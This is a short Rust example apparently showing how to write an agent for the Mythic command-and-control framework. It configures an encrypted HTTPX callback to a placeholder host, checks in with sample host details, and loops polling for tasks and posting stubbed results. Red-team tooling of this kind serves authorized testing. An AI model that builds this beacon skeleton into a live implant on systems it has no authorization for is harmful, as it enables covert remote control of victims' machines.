use mythic::{MythicAgent, TaskResponse};
use mythic::transport::httpx::{HttpxConfig, HttpxTransport};
use std::thread::sleep;
use std::time::Duration;
use uuid::Uuid;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let payload_uuid = Uuid::parse_str("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")?;

    // 32-byte AES-256 key, base64-encoded. Must match the key configured in
    // the Mythic payload builder for this agent.
    let aes_key_b64 = "YOUR_BASE64_AES_256_KEY_HERE";

    // Build the HTTPX transport. Query parameter `id` will carry URL-safe
    // base64 tasking requests, matching the Mythic `httpx` profile.
    let cfg = HttpxConfig {
        callback_host: "https://c2.example.com".into(),
        callback_port: 443,
        get_uri: "index".into(),
        post_uri: "data".into(),
        query_path_name: Some("id".into()),
        aes_psk: Some(aes_key_b64.into()),
        ..Default::default()
    };
    let mut c2 = HttpxTransport::new(cfg)?;

    // 1. Checkin
    let agent = MythicAgent::easy_checkin(
        payload_uuid,
        &mut c2,
        vec!["10.0.0.1".into()],
        Some("linux".into()),
        Some("root".into()),
        Some("web01".into()),
        Some(1337),
        Some("x86_64".into()),
        None, None, None, None, None, None,
    )?;
    println!("callback UUID: {}", agent.callback_uuid());

    // 2. Main tasking loop
    loop {
        // -1 asks Mythic for all available tasks
        let tasks = agent.get_tasking(-1, &c2)?;

        for t in &tasks.tasks {
            // 3. Execute the task (replace with real work)
            let output = format!("completed task {}", t.id);

            // 4. Send the response back
            agent.post_response(
                vec![TaskResponse::completed(t.id, &output)],
                &c2,
            )?;
        }

        sleep(Duration::from_secs(10));
    }
}
